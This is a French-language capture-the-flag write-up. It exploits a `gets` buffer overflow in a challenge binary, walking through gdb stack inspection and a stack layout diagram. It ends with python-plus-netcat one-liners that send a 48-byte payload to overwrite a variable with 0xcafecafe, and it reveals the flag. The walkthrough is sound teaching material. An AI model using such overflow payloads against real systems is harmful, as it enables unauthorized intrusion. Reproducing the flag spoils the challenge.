# Write up

La fonction `gets` est dépréciée car elle n'est pas sécuritaire, mais elle existe toujours. Dans la plupart des versions de son `manpage`, on retrouve la phrase "Never use this function.". Cette fonction vulnérable nous permet de dépasser le _buffer_ alloué pour notre nom afin de modifier la valeur d'une variable pour passer la vérification qui nous donnera accès au flag.

En ouvrant le programme dans `gdb`, on peut voir l'état de la _stack_, pour observer le positionnement des variables dans celle-ci. Ceci nous permettra de mieux savoir comment exploiter le dépassement de tampon.

Dans l'exemple suivant, j'ai entré "TESTEST" comme nom. Voici la _stack_ près l'appel à `gets`:

```
gef➤  x/12wx $rsp
0x7fffffffd9d0: 0x54534554      0x00545345      0xf7e29ba5      0x00007fff
0x7fffffffd9e0: 0x00000004      0x42060000      0xae147ae1      0x406f8147
0x7fffffffd9f0: 0xffffffff      0xffffffff      0x00000000      0x00000005
// emplacement de $rbp
```

Remarquez que l'espace restant après le byte NUL (0x00) qui reste de terminateur de chaîne de caractère contient une valeur qui semble être une addresse. Ceci est simplement dû au fait que la mémoire n'est pas toujours réinitialisée sauf si on le fait explicitement. Comme une _string_ est terminée par un byte NUL, ce qui se trouve après celui-ci ne sera pas considéré.

En utilisant la taille de chacun des types ainsi que les valeurs connues des variables, on peut faire une représentation visuelle de la pile comme ceci:

```
                | 16 bytes                         |
                |  8 bytes      |  8 bytes         |
                |  4    | 4     |   4    |  4      |
                |----------------------------------|
                |----------------------------------|
0x7fffffffd9d0  | qui                              |
                |----------------------------------|
0x7fffffffd9e0  | quand | ou    | comment          |
                |----------------------------------|
0x7fffffffd9f0  | quoi          |padding | pourquoi|
                |----------------------------------|
0x7fffffffda00  | <Base de la frame actuelle de pile> ($rbp)
```

Notez que les addresses données dans l'exemple vont varier pour chaque machine et chaque exécution. Ceci n'est pas un problème.

Comme on peut observer dans les instructions suivant l'appel à `gets`, notre objectif est que la variable située à $rbp-4, (`pourquoi`, qui vaut actuellement 5) vale 0xcafecafe.

```
0x5555555551b7 <degoutte+78>    mov    eax, DWORD PTR [rbp-0x4]
0x5555555551ba <degoutte+81>    cmp    eax, 0xcafecafe
```

Il faut donc que l'on envoie un payload de 48 bytes, dont les 4 dernières sont 0xcafecafe. Il existe plusieurs manières d'écrire des bytes `raw` via la ligne de commandes. Nous avons utilisé `python` pour le faire.

```
python2 -c 'print("A"*44 + "\xfe\xca\xfe\xca")' | nc challenges.unitedctf.ca 17000

ou bien

python3 -c 'import sys; sys.stdout.buffer.write(b"A"*44 + b"\xfe\xca\xfe\xca" + b"\n")' | nc localhost 17000
```

Et on obtient le flag FLAG-Buff3r_0verflow3d_nh6qAgs0Yw4 !

